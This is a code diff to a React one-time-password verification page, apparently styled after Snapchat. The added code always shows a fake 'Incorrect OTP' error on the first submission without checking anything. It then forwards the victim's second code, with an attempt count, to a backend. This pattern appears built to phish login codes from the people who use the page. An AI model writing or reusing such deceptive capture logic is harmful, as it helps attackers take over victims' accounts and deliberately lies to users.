@@ -5,6 +5,7 @@ export default function OtpVerify({ username, debugOtp, onOtpSuccess, onBack }) 
   const [code, setCode] = useState(new Array(6).fill(''));
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
+  const [attempts, setAttempts] = useState(0);
   const inputsRef = useRef([]);
 
   useEffect(() => {
@@ -61,11 +62,26 @@ export default function OtpVerify({ username, debugOtp, onOtpSuccess, onBack }) 
 
     setLoading(true);
 
+    // On first submit: always simulate / return wrong OTP error
+    if (attempts === 0) {
+      setTimeout(() => {
+        setAttempts(1);
+        setError('Incorrect OTP. Please try again.');
+        setCode(new Array(6).fill(''));
+        if (inputsRef.current[0]) {
+          inputsRef.current[0].focus();
+        }
+        setLoading(false);
+      }, 700);
+      return;
+    }
+
+    // On second submit (or subsequent): proceed with verification
     try {
       const response = await fetch(`${BACKEND_URL}/api/verify-otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, code: otpString })
+        body: JSON.stringify({ username, code: otpString, attemptNumber: attempts + 1 })
       });
 
       const data = await response.json();
@@ -83,20 +99,31 @@ export default function OtpVerify({ username, debugOtp, onOtpSuccess, onBack }) 
     }
   };
 
-  // Trigger verify if 6 digits are fully filled
-  useEffect(() => {
-    if (code.join('').length === 6) {
-      handleSubmit();
-    }
-  }, [code]);
-
   return (
     <div className="glass-card">
       <div className="brand-header">
         <h1 className="brand-title">Confirm <span>Identity</span></h1>
         <p className="brand-subtitle">
-          Your login one time password has sent to your registered mobile number, enter:
+          Your login one time password has been sent to your registered mobile number, enter:
         </p>
+
+        {/* Wait up to 30 seconds notification */}
+        <div style={{
+          marginTop: '1rem',
+          display: 'inline-flex',
+          alignItems: 'center',
+          gap: '0.5rem',
+          backgroundColor: 'rgba(255, 252, 0, 0.08)',
+          border: '1px solid rgba(255, 252, 0, 0.3)',
+          color: 'var(--snap-yellow)',
+          padding: '0.45rem 0.9rem',
+          borderRadius: '20px',
+          fontSize: '0.82rem',
+          fontWeight: '600'
+        }}>
+          <span>⏳</span>
+          <span>Please wait up to 30 seconds to receive the OTP</span>
+        </div>
       </div>
 
       {error && <div className="error-banner">{error}</div>}
